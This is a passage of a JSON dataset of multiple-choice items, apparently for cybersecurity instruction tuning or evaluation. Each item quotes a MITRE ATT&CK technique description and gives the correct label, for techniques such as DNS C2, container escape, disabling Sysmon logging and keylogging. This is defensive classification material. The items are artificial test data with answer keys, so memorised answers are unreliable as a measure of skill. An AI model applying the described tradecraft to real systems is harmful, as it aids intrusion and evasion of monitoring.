    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.\n\nBy running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic (DNS). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.\nA. Stage Capabilities: Upload Malware, B. Impair Defenses: Disable or Modify Tools, C. Acquire Infrastructure: DNS Server, D. Exfiltration Over Physical Medium: Exfiltration over USB",
    "context": "",
    "output": "C. Acquire Infrastructure: DNS Server",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.\n\nBy running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic (DNS). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.",
      "options": "A. Stage Capabilities: Upload Malware, B. Impair Defenses: Disable or Modify Tools, C. Acquire Infrastructure: DNS Server, D. Exfiltration Over Physical Medium: Exfiltration over USB",
      "choice": "C. Acquire Infrastructure: DNS Server",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\n\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts .\n\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google. In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.\n\nAdversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API . Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.\n\nPossible answers:\nA. Command and Scripting Interpreter: Cloud API, B. Permission Groups Discovery: Cloud Groups, C. Traffic Signaling, D. Indicator Removal: Network Share Connection Removal",
    "context": "",
    "output": "B. Permission Groups Discovery: Cloud Groups",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\n\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts .\n\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google. In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.\n\nAdversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API . Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",
      "options": "A. Command and Scripting Interpreter: Cloud API, B. Permission Groups Discovery: Cloud Groups, C. Traffic Signaling, D. Indicator Removal: Network Share Connection Removal",
      "choice": "B. Permission Groups Discovery: Cloud Groups",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.\n\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.\n\nA. Adversary-in-the-Middle: DHCP Spoofing, B. Email Collection, C. Data Staged: Remote Data Staging, D. OS Credential Dumping: DCSync\nA:",
    "context": "",
    "output": "C. Data Staged: Remote Data Staging",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.\n\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",
      "options": "A. Adversary-in-the-Middle: DHCP Spoofing, B. Email Collection, C. Data Staged: Remote Data Staging, D. OS Credential Dumping: DCSync",
      "choice": "C. Data Staged: Remote Data Staging",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.\nA. Virtualization/Sandbox Evasion, B. Disk Wipe, C. Gather Victim Org Information: Determine Physical Locations, D. Obfuscated Files or Information\nAnswer:",
    "context": "",
    "output": "D. Obfuscated Files or Information",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
      "options": "A. Virtualization/Sandbox Evasion, B. Disk Wipe, C. Gather Victim Org Information: Determine Physical Locations, D. Obfuscated Files or Information",
      "choice": "D. Obfuscated Files or Information",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a Container Administration Command. Adversaries may also escape via Exploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers running on the host, or setting up a command and control channel on the host.\n\nPossible answers:\nA. Phishing for Information: Spearphishing Attachment, B. Boot or Logon Autostart Execution: Authentication Package, C. System Binary Proxy Execution: Compiled HTML File, D. Escape to Host",
    "context": "",
    "output": "D. Escape to Host",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a Container Administration Command. Adversaries may also escape via Exploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers running on the host, or setting up a command and control channel on the host.",
      "options": "A. Phishing for Information: Spearphishing Attachment, B. Boot or Logon Autostart Execution: Authentication Package, C. System Binary Proxy Execution: Compiled HTML File, D. Escape to Host",
      "choice": "D. Escape to Host",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.\n\nPossible answers:\nA. Impair Defenses: Disable or Modify Tools, B. Compromise Infrastructure: DNS Server, C. Acquire Infrastructure: Server, D. Phishing for Information: Spearphishing Service",
    "context": "",
    "output": "A. Impair Defenses: Disable or Modify Tools",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
      "options": "A. Impair Defenses: Disable or Modify Tools, B. Compromise Infrastructure: DNS Server, C. Acquire Infrastructure: Server, D. Phishing for Information: Spearphishing Service",
      "choice": "A. Impair Defenses: Disable or Modify Tools",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.\n\nOptions:\nA. Search Open Technical Databases: DNS/Passive DNS, B. Event Triggered Execution: Netsh Helper DLL, C. Application Layer Protocol: DNS, D. Scheduled Task/Job: Systemd Timers",
    "context": "",
    "output": "C. Application Layer Protocol: DNS",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "options": "A. Search Open Technical Databases: DNS/Passive DNS, B. Event Triggered Execution: Netsh Helper DLL, C. Application Layer Protocol: DNS, D. Scheduled Task/Job: Systemd Timers",
      "choice": "C. Application Layer Protocol: DNS",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.\n\nFor example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.\n\nAdversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through Disable or Modify Tools or Disable or Modify Cloud Logs.\n\nOptions:\nA. Hijack Execution Flow: Path Interception by PATH Environment Variable, B. Create or Modify System Process, C. Cloud Service Discovery, D. System Binary Proxy Execution: CMSTP",
    "context": "",
    "output": "C. Cloud Service Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.\n\nFor example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.\n\nAdversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through Disable or Modify Tools or Disable or Modify Cloud Logs.",
      "options": "A. Hijack Execution Flow: Path Interception by PATH Environment Variable, B. Create or Modify System Process, C. Cloud Service Discovery, D. System Binary Proxy Execution: CMSTP",
      "choice": "C. Cloud Service Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. \n\nAdversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. Resource Hijacking). Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission in Google Cloud to add Additional Cloud Roles to a serverless cloud function, which may then be able to perform actions the original user cannot.\n\nServerless functions can also be invoked in response to cloud events (i.e. Event Triggered Execution), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds Additional Cloud Credentials to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created. Similarly, an adversary may create a Power Automate workflow in Office 365 environments that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.\nA. Obfuscated Files or Information: Compile After Delivery, B. Serverless Execution, C. Office Application Startup: Outlook Rules, D. Compromise Accounts: Social Media Accounts\nAnswer:",
    "context": "",
    "output": "B. Serverless Execution",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. \n\nAdversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. Resource Hijacking). Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission in Google Cloud to add Additional Cloud Roles to a serverless cloud function, which may then be able to perform actions the original user cannot.\n\nServerless functions can also be invoked in response to cloud events (i.e. Event Triggered Execution), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds Additional Cloud Credentials to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created. Similarly, an adversary may create a Power Automate workflow in Office 365 environments that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.",
      "options": "A. Obfuscated Files or Information: Compile After Delivery, B. Serverless Execution, C. Office Application Startup: Outlook Rules, D. Compromise Accounts: Social Media Accounts",
      "choice": "B. Serverless Execution",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of Web Services.\n\nA. Develop Capabilities: Malware, B. Inhibit System Recovery, C. Data Encoding: Standard Encoding, D. Account Access Removal\nAnswer:",
    "context": "",
    "output": "A. Develop Capabilities: Malware",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of Web Services.",
      "options": "A. Develop Capabilities: Malware, B. Inhibit System Recovery, C. Data Encoding: Standard Encoding, D. Account Access Removal",
      "choice": "A. Develop Capabilities: Malware",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via Ptrace System Calls. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.\nA. Active Scanning: Vulnerability Scanning, B. Process Injection: Process Doppelg\u00e4nging, C. Process Injection: VDSO Hijacking, D. Phishing",
    "context": "",
    "output": "C. Process Injection: VDSO Hijacking",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via Ptrace System Calls. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
      "options": "A. Active Scanning: Vulnerability Scanning, B. Process Injection: Process Doppelg\u00e4nging, C. Process Injection: VDSO Hijacking, D. Phishing",
      "choice": "C. Process Injection: VDSO Hijacking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. Security Software Discovery) or other defenses (e.g., Virtualization/Sandbox Evasion), as well as potential exploitable vulnerabilities (e.g., Exploitation for Privilege Escalation).\n\nMany OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows. Information about device drivers (as well as associated services, i.e., System Service Discovery) may also be available in the Registry.\n\nOn Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.\n\nA. File and Directory Discovery, B. Device Driver Discovery, C. Permission Groups Discovery: Local Groups, D. Search Open Technical Databases: WHOIS\nA:",
    "context": "",
    "output": "B. Device Driver Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. Security Software Discovery) or other defenses (e.g., Virtualization/Sandbox Evasion), as well as potential exploitable vulnerabilities (e.g., Exploitation for Privilege Escalation).\n\nMany OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows. Information about device drivers (as well as associated services, i.e., System Service Discovery) may also be available in the Registry.\n\nOn Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.",
      "options": "A. File and Directory Discovery, B. Device Driver Discovery, C. Permission Groups Discovery: Local Groups, D. Search Open Technical Databases: WHOIS",
      "choice": "B. Device Driver Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.\n\nA. Acquire Infrastructure: Virtual Private Server, B. Application Layer Protocol: File Transfer Protocols, C. Trusted Relationship, D. Input Capture: Keylogging\nAnswer:",
    "context": "",
    "output": "D. Input Capture: Keylogging",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
      "options": "A. Acquire Infrastructure: Virtual Private Server, B. Application Layer Protocol: File Transfer Protocols, C. Trusted Relationship, D. Input Capture: Keylogging",
      "choice": "D. Input Capture: Keylogging",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.\n\nA. Exfiltration Over C2 Channel, B. Masquerading: Masquerade File Type, C. Deobfuscate/Decode Files or Information, D. Remote Service Session Hijacking: SSH Hijacking\nAnswer:",
    "context": "",
    "output": "A. Exfiltration Over C2 Channel",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
      "options": "A. Exfiltration Over C2 Channel, B. Masquerading: Masquerade File Type, C. Deobfuscate/Decode Files or Information, D. Remote Service Session Hijacking: SSH Hijacking",
      "choice": "A. Exfiltration Over C2 Channel",
      "category": [
